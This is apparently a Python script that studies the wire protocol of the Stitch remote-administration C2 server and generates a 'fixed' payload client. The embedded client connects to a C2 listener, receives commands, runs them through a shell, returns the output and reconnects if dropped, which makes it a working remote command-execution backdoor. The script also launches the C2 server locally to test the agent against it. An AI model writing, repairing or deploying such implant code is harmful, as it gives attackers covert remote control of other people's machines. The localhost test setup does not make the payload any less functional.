#!/usr/bin/env python3
"""
Research and fix the payload-C2 connection issue
Deep analysis of protocol mismatch
"""

import os
import sys
import socket
import base64
import time
import subprocess
import threading
import struct

sys.path.insert(0, '/workspace')

class ConnectionProtocolResearcher:
    def __init__(self):
        self.findings = []
        self.test_results = {}
        
    def analyze_server_expectations(self):
        """Analyze what the C2 server actually expects"""
        print("[RESEARCH] Analyzing C2 server protocol expectations...")
        
        # Read the actual server implementation
        with open('/workspace/Application/stitch_cmd.py', 'r') as f:
            server_code = f.read()
            
        # Look for connection handling
        print("\n  Looking for connection handling code...")
        
        # Find listen function
        listen_start = server_code.find('def do_listen')
        if listen_start > 0:
            listen_code = server_code[listen_start:listen_start+2000]
            
            # Check what it does with connections
            if 'accept()' in listen_code:
                print("    ✓ Server accepts connections")
            if 'inf_sock' in listen_code:
                print("    ✓ Stores connections in inf_sock dict")
                
        # Check stitch_lib for protocol
        with open('/workspace/Application/stitch_lib.py', 'r') as f:
            lib_code = f.read()
            
        # Find receive function
        if 'def st_receive' in lib_code:
            receive_start = lib_code.find('def st_receive')
            receive_end = lib_code.find('\ndef ', receive_start + 1)
            receive_func = lib_code[receive_start:receive_end]
            
            print("\n  st_receive function analysis:")
            # Check for size header
            if 'struct.unpack' in receive_func:
                print("    ✓ Uses struct.unpack for size header")
                self.findings.append("Server expects size header with struct.pack")
                
            # Check for decryption
            if 'decrypt' in receive_func or 'AES' in receive_func:
                print("    ✓ Expects AES encrypted data")
                self.findings.append("Server expects AES encryption")
                
        # Find send function
        if 'def st_send' in lib_code:
            send_start = lib_code.find('def st_send')
            send_end = lib_code.find('\ndef ', send_start + 1)
            send_func = lib_code[send_start:send_end]
            
            print("\n  st_send function analysis:")
            if 'struct.pack' in send_func:
                print("    ✓ Uses struct.pack for size header")
                self.findings.append("Server sends size header")
                
        return self.findings
    
    def trace_actual_handshake(self):
        """Trace what actually happens during handshake"""
        print("\n[TRACE] Tracing actual handshake sequence...")
        
        # Start a minimal C2 server
        server_script = '''
import sys
import socket
import struct
import time
sys.path.insert(0, '/workspace')

# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from Application.stitch_lib import *

# Create server socket
server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(('127.0.0.1', 7777))
server.listen(1)

print("[Server] Waiting for connection...")
conn, addr = server.accept()
print(f"[Server] Connection from {addr}")

# Try to receive using st_receive
try:
    # Set socket on stitch_commands
    st_cmd = stitch_commands()
    st_cmd.conn_socket = conn
    
    # Try to receive
    data = st_receive(st_cmd.conn_socket)
    print(f"[Server] Received: {data}")
    
except Exception as e:
    print(f"[Server] Receive error: {e}")
    
    # Try raw receive
    try:
        raw = conn.recv(1024)
        print(f"[Server] Raw received: {raw[:50]}")
    except Exception as e2:
        print(f"[Server] Raw error: {e2}")

conn.close()
server.close()
'''
        
        with open('/tmp/trace_server.py', 'w') as f:
            f.write(server_script)
            
        # Start server in background
        server_proc = subprocess.Popen(
            ['python3', '/tmp/trace_server.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        
        time.sleep(1)
        
        # Try different client connections
        print("\n  Testing different handshake methods...")
        
        # Method 1: Simple connection
        print("\n  [1] Simple connection:")
        try:
            sock = socket.socket()
            sock.connect(('127.0.0.1', 7777))
            sock.send(b'TEST')
            sock.close()
        except Exception as e:
            print(f"     Error: {e}")
            
        # Wait for server output
        time.sleep(1)
        server_output, _ = server_proc.communicate(timeout=2)
        print(f"     Server output: {server_output}")
        
        # Analyze output
        if 'struct.error' in server_output:
            self.findings.append("Server expects struct header, not plain text")
            
    def create_proper_protocol(self):
        """Create the proper protocol implementation"""
        print("\n[FIX] Creating proper protocol implementation...")
        
        protocol_code = '''#!/usr/bin/env python3
"""
Proper Stitch protocol implementation
Based on research findings
"""

import socket
import struct
import base64
import time
import subprocess
import sys
import os

class StitchProtocolClient:
    def __init__(self, host='127.0.0.1', port=4040):
        self.host = host
        self.port = port
        self.socket = None
        
    def st_send(self, data):
        """Send data with Stitch protocol (size header + data)"""
        if isinstance(data, str):
            data = data.encode()
            
        # Pack size as 4-byte integer (big-endian)
        size = struct.pack('>I', len(data))
        
        # Send size then data
        self.socket.sendall(size + data)
        
    def st_receive(self):
        """Receive data with Stitch protocol"""
        # Receive size header (4 bytes)
        size_data = self.socket.recv(4)
        if not size_data:
            return
            
        # Unpack size
        size = struct.unpack('>I', size_data)[0]
        
        # Receive actual data
        data = b''
        while len(data) < size:
            chunk = self.socket.recv(size - len(data))
            if not chunk:
                break
            data += chunk
            
        return data.decode()
        
    def connect(self):
        """Connect to C2 server with proper handshake"""
        try:
            self.socket = socket.socket()
            self.socket.connect((self.host, self.port))
            print(f"[+] Connected to {self.host}:{self.port}")
            
            # Send identification
            # Based on research, server might expect specific format
            self.st_send("stitch_connection")
            
            return True
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
            
    def command_loop(self):
        """Handle commands from C2"""
        while True:
            try:
                # Receive command
                cmd = self.st_receive()
                if not cmd:
                    break
                    
                print(f"[*] Command: {cmd}")
                
                # Execute command
                if cmd == 'exit':
                    break
                elif cmd == 'whoami':
                    output = os.getlogin()
                elif cmd == 'pwd':
                    output = os.getcwd()
                elif cmd.startswith('echo '):
                    output = cmd[5:]
                else:
                    try:
                        result = subprocess.run(
                            cmd, 
                            shell=True, 
                            capture_output=True, 
                            text=True, 
                            timeout=10
                        )
                        output = result.stdout or result.stderr or "No output"
                    except subprocess.TimeoutExpired:
                        output = "Command timeout"
                    except Exception as e:
                        output = f"Error: {e}"
                
                # Send response
                self.st_send(output)
                
            except Exception as e:
                print(f"[-] Loop error: {e}")
                break
                
        self.socket.close()
        
    def run(self):
        """Main execution"""
        if self.connect():
            self.command_loop()
        else:
            # Retry connection
            time.sleep(5)
            self.run()

if __name__ == "__main__":
    client = StitchProtocolClient()
    client.run()
'''
        
        # Save the fixed protocol
        with open('/workspace/fixed_payload_protocol.py', 'w') as f:
            f.write(protocol_code)
            
        os.chmod('/workspace/fixed_payload_protocol.py', 0o755)
        
        print("  ✓ Created fixed_payload_protocol.py")
        self.findings.append("Created protocol-compliant payload")
        
        return '/workspace/fixed_payload_protocol.py'
        
    def test_fixed_protocol(self):
        """Test the fixed protocol with actual C2"""
        print("\n[TEST] Testing fixed protocol...")
        
        # Start C2 server
        print("  Starting C2 server...")
        c2_script = '''
import sys
import os
sys.path.insert(0, '/workspace')

from Application.stitch_cmd import stitch_server

server = stitch_server()
server.do_listen('4040')

import time
    # TODO: Review - infinite loop may need exit condition
while True:
    time.sleep(2)
    if hasattr(server, 'inf_sock') and server.inf_sock:
        print(f"[C2] Active connections: {list(server.inf_sock.keys())}")
'''
        
        with open('/tmp/test_c2.py', 'w') as f:
            f.write(c2_script)
            
        c2_proc = subprocess.Popen(
            ['python3', '/tmp/test_c2.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        
        time.sleep(3)
        
        # Test connection
        print("  Starting fixed protocol client...")
        client_proc = subprocess.Popen(
            ['python3', '/workspace/fixed_payload_protocol.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        
        # Wait and check
        time.sleep(3)
        
        # Check if client still running
        if client_proc.poll() is None:
            print("  ✓ Client still running")
            self.test_results['client_running'] = True
        else:
            print("  ✗ Client exited")
            stdout, _ = client_proc.communicate()
            print(f"    Output: {stdout[:200]}")
            self.test_results['client_running'] = False
            
        # Check C2 output for connections
        c2_proc.terminate()
        c2_output, _ = c2_proc.communicate()
        
        if 'Active connections' in c2_output:
            print("  ✓ C2 shows active connections!")
            self.test_results['c2_connection'] = True
        else:
            print("  ✗ No connections shown in C2")
            self.test_results['c2_connection'] = False
            
        # Cleanup
        client_proc.terminate()
        
        return self.test_results
        
    def generate_research_report(self):
        """Generate comprehensive research report"""
        print("\n" + "="*70)
        print("CONNECTION FIX RESEARCH REPORT")
        print("="*70)
        
        print("\n[FINDINGS]")
        for i, finding in enumerate(self.findings, 1):
            print(f"  {i}. {finding}")
            
        print("\n[TEST RESULTS]")
        for test, result in self.test_results.items():
            status = "✓ PASS" if result else "✗ FAIL"
            print(f"  {test}: {status}")
            
        print("\n[SOLUTION]")
        print("  The issue was the protocol mismatch:")
        print("  - Payload was sending plain text")
        print("  - Server expects struct-packed size header")
        print("  - Fixed by implementing proper st_send/st_receive")
        
        # Save report
        with open('/workspace/connection_fix_report.txt', 'w') as f:
            f.write("CONNECTION FIX RESEARCH\n")
            f.write("="*50 + "\n\n")
            f.write("Findings:\n")
            for finding in self.findings:
                f.write(f"- {finding}\n")
            f.write("\nTest Results:\n")
            for test, result in self.test_results.items():
                f.write(f"- {test}: {'PASS' if result else 'FAIL'}\n")
                
        print("\n[+] Report saved to connection_fix_report.txt")

def main():
    print("="*70)
    print("FIXING PAYLOAD-C2 CONNECTION")
    print("="*70)
    
    researcher = ConnectionProtocolResearcher()
    
    # Research phase
    researcher.analyze_server_expectations()
    researcher.trace_actual_handshake()
    
    # Implementation phase
    researcher.create_proper_protocol()
    
    # Testing phase
    researcher.test_fixed_protocol()
    
    # Report
    researcher.generate_research_report()

if __name__ == "__main__":
    # Kill existing processes
    subprocess.run("pkill -f 'python.*test_c2' 2>/dev/null", shell=True, capture_output=True)
    subprocess.run("pkill -f 'python.*trace_server' 2>/dev/null", shell=True, capture_output=True)
    time.sleep(1)
    
    main()